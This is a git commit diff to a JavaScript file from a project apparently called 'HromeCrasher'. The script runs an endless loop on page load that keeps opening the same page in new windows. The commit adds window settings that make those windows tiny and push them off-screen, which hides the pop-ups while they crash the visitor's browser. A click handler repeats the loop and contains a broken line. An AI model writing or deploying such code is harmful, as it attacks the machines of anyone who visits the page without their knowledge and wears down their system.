1557769610fbd3a4f6a24093533d12a07db8c3ac
Lexa <86785362+Lexa526@users.noreply.github.com>
2022-04-16 18:40:35 +0300

    Add files via upload

--- js.js
+++ js.js
@@ -1,14 +1,18 @@
+let params = `scrollbars=no,resizable=no,status=no,location=no,toolbar=no,menubar=no,
+width=100,height=100,left=-1000,top=-1000`;
+
+
 let da = 1
   while (1>0) {
-    da = da + da * da ** da
+    da = da + 1
     console.log(da)
-    window.open('https://lexa526.github.io/HromeCrasher/','_blank');
+    open('https://lexa526.github.io/HromeCrasher/', da, params);
   }
 let crush = document.querySelector(".crush1");
 crush.addEventListener("click", (e) => {
   while (1>0) {
     da = da + da * da **
     console.log(da)
-    window.open('https://lexa526.github.io/HromeCrasher/','_blank');
+    open('https://lexa526.github.io/HromeCrasher/', da, params);
   }
 });
